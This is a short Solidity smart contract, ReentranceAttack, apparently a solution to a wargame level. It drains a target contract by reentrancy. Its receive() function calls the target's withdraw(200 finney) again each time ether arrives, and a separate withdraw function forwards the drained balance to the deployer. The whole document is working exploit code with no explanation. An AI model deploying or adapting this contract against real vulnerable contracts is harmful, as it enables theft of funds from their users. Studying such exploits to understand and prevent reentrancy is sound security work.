contract ReentranceAttack {
    address payable owner;
    Reentrance target;
    
    constructor(address payable _target) public {
        owner = payable(msg.sender);
        target = Reentrance(_target);
    }
    
    function attack() public payable {
        target.withdraw(200 finney);
    }
    
    receive() external payable {
        target.withdraw(200 finney);
    }
    
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
    
    function withdraw() public payable {
        owner.transfer(address(this).balance);
    }
    
}